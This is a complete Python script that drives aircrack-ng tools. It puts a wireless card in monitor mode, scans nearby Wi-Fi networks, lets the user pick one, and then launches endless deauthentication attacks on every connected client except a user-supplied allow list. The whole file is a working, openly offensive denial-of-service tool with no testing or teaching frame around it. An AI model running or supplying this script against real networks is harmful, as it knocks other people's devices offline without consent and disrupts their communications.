#!/usr/bin/python3

# use csv to work with the data captured by airodump-ng
import csv
import os
import re
import subprocess
import threading
import time

def find_nic():
    result = subprocess.run(['iw', 'dev'], capture_output=True).stdout.decode()
    wlan_code = re.compile('Interface (wlan[0-9]+)')
    network_interface_controllers = wlan_code.findall(result)
    return network_interface_controllers

def set_monitor_mode(wifi_name):
    # kill conflicting processes to make sure that nothing interferes
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # put the nic in monitor mode
    subprocess.run(['airmon-ng', 'start', wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return wifi_name + 'mon'

def get_available_networks(band_choice, wifi_name):
    # bands b and g are 2.4ghz, band a is 5ghz and band a, b and g (actually band n), uses 2.4ghz and 5ghz
    bands = {0: 'bg', 1: 'a', 2: 'abg'}
    process_args = ['airodump-ng', '--band', bands[band_choice], '-w', 'airodumpResult', '--write-interval', '1', '--output-format', 'csv', wifi_name]
    airodump_process = subprocess.Popen(process_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return airodump_process

def check_for_essid(essid, lst):
    # checks if the essid is already in the list
    check_status = True

    # if no ESSIDs in list add the row
    if len(lst) == 0:
        return check_status

    for item in lst:
        # essid is already inside the list so no need to add it again
        if essid in item['ESSID']:
            check_status = False

    return check_status

def wifi_networks_menu(airodump_process):
    # contains all the fildnames for the csv entries
    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
    active_wireless_networks = []
    try:
        while True:
            # clear the screen before printing the available network interfaces
            subprocess.call('clear', shell=True)

            for file_name in os.listdir():
                # check the file name
                if file_name == 'airodumpResult-01.csv':
                    # if the file is the one that airodump created, proceed
                    with open(file_name, 'r') as f:
                        # DictReader creates a list with dicts with the keys specified in the fieldnames
                        csv_reader = csv.DictReader(f, fieldnames=fieldnames)

                        for row in csv_reader:
                            if row['BSSID'] == 'BSSID':
                                pass
                            elif row['BSSID'] == 'Station MAC':
                                break
                            elif check_for_essid(row['ESSID'], active_wireless_networks):
                                active_wireless_networks.append(row)

            # print the selection 'titles'
            print('Scanning. Press Ctrl+C when you want to select which wireless network to attack.\n')
            print('|No |\t|BSSID              |\t|Channel |\t|ESSID                         |')
            print('|___|\t|___________________|\t|________|\t|______________________________|')
            # print the options
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            # sleep for one second (wait for airodump-ng to discover more networks)
            time.sleep(1)

    except KeyboardInterrupt:
        print('\nDeleting csv files from the airodump-ng scan..')
        # terminate the airodump process
        airodump_process.terminate()
        airodump_process.wait()
        # delete the csv file
        subprocess.call(['rm', 'airodumpResult-01.csv'])
        print('Ready to make choice.')

    # make sure that the option is valid
    while True:
        net_choice = input('Select a network from above: ')
        try:
            # the input might not be a valid integer
            if active_wireless_networks[int(net_choice)]:
                break
        except:
            print('Make a valid choice.')
    
    return active_wireless_networks[int(net_choice)]

def get_clients(wifi_network_choice, wifi_name):
    # we need to get the clients so we can create a thread for each one to deauth them
    process_args = ['airodump-ng', '--bssid', wifi_network_choice['BSSID'], '--channel', wifi_network_choice['channel'].strip(), '-w', 'clients', '--write-interval', '1', '--output-format', 'csv', wifi_name]
    airodump_process = subprocess.Popen(process_args,  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return airodump_process

def deauth_attack(network_mac, target_mac, interface):
    # using aireplay-ng to send a deauth packet. 0 means it will send it indefinitely. -a is used to specify the MAC address of the target router. -c is used to specify the mac we want to send the deauth packet
    subprocess.run(['aireplay-ng', '--deauth', '0', '-a', network_mac, '-c', target_mac, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def set_into_managed_mode(wifi_name):
    # put wirelless card back into managed mode
    subprocess.run(['airmon-ng', 'stop', wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # restart the services
    subprocess.run(['systemctl', 'start', 'NetworkManager'])
    subprocess.run(['systemctl', 'start', 'wpa_supplicant'])

def attack(airodump_process, macs_not_to_kick_off, wifi_network_choice, wifi_name):
    active_clients = set()
    # threads 'tracker'
    threads_started = []

    try:
        fieldnames = ['Station MAC', 'First time seen', 'Last time seen', 'Power', 'packets', 'BSSID', 'Probed ESSIDs']

        print('Starting Deauth attack, press Ctrl+C to stop!')
        while True:

            # clear the screen
            for file_name in os.listdir():
                # check file name
                if file_name == 'clients-01.csv':
                    # read thee file with the connected clients
                    with open(file_name, 'r') as f:
                        csv_reader = csv.DictReader(f, fieldnames=fieldnames)

                        for index, row in enumerate(csv_reader):
                            if index < 3 or row['Station MAC'] in macs_not_to_kick_off:
                                # ignore stuff before the mac addresses and do not attack the macs specified in the benginning
                                pass
                            else:
                                # add all the active macs
                                active_clients.add(row['Station MAC'])

            for item in active_clients:
                # check if a thread has already been created to deauth the current mac in the loop
                if item not in threads_started:
                    # keep track of created threads and actually create and start them
                    threads_started.append(item)
                    threading.Thread(target=deauth_attack, args=[wifi_network_choice['BSSID'], item, wifi_name], daemon=True).start()

    except KeyboardInterrupt:
        print('Stopping Deauth!')
        print('Deleting csv files from the airodump-ng clients scan..')
        # terminate the airodump process
        airodump_process.terminate()
        airodump_process.wait()
        # delete the csv file
        subprocess.call(['rm', 'clients-01.csv'])

        # Set the network interface controller back into managed mode and restart network services.
        set_into_managed_mode(wifi_name)
        print('Network interface is back in managed mode!')

def main():
    # clear the screen
    subprocess.call('clear', shell=True)
    # print banner
    print(r'''
    __                 __ (_) ________ (_)   ______          ___________
    \ \      ___      / / ___ | ______|___   |  _  \ _____  /  ________\
     \ \    /   \    / /  | | | |___   | |   | | | |/     \|  /_________
      \ \__/     \__/ /   | | | ____|  | |   | | | /  / \  \__________  \
       \     ___     /    | | | |      | |   | |/ /\  \ /  /_________/  /
        \___/   \___/     |_| |_|      |_|   |___/  \_____/____________/
    ''')

    # check if the script is running with sudo permissions
    if 'SUDO_UID' not in os.environ.keys():
        print('You should run this script with sudo!!')
        exit()

    # request Mac Addresses to be kept on network
    print('Enter the MAC Address(es) of the devices to keep on the network.')
    macs = input('Separate the macs with a comma: ')
    # use regex to find all macs
    mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
    macs_not_to_kick_off = mac_address_regex.findall(macs)

    if len(macs_not_to_kick_off) > 0:
        macs_not_to_kick_off = [mac.upper() for mac in macs_not_to_kick_off]
    else:
        macs_not_to_kick_off = None

    # menu to ask which bands to scan with airmon-ng
    while True:
        # space out from the menus on top
        print()

        # print the options
        print('0 - bg (2.4Ghz)\n1 - a (5Ghz)\n2 - abg (Will be slower)')
        band_choice = input('Select a band to scan: ')

        try:
            # the choice might not be an integer
            band_choice = int(band_choice)
            if band_choice >= 0 and band_choice <= 2:
                break # break out of the loop
            else:
                print('Make a valid choice.')
        except:
            print('Make a valid choice.')
    
    # find all network interface controller
    network_controllers = find_nic()
    if len(network_controllers) == 0:
        # no network interface controller were found
        print('Connect a network interface controller and try again!!')
        exit()
    
    # select the network interface to use (put in monitor mode)
    while True:
        # space out from the menus on top
        print()

        for index, controller in enumerate(network_controllers):
            print(f'{index} - {controller}')

        controller_choice = input('Select the controller you want to use: ')
        try:
            # the choice might not be a valid one
            if network_controllers[int(controller_choice)]:
                break
        except:
            print('Make a valid choice.')

    wifi_name = network_controllers[int(controller_choice)]
    # set the network interface controller to monitor mode
    wifi_name = set_monitor_mode(wifi_name) # return the wifi_name with the 'mon' suffix
    airodump_process = get_available_networks(band_choice, wifi_name)

    # print wifi menu
    wifi_network_choice = wifi_networks_menu(airodump_process)

    # set the correct channel
    subprocess.run(['iwconfig', wifi_name, 'channel', wifi_network_choice['channel'].strip()])

    # run only agains the network we want to kick clients off
    airodump_process = get_clients(wifi_network_choice, wifi_name)

    # attack the clients
    attack(airodump_process, macs_not_to_kick_off, wifi_network_choice, wifi_name)

if __name__ == '__main__':
    main()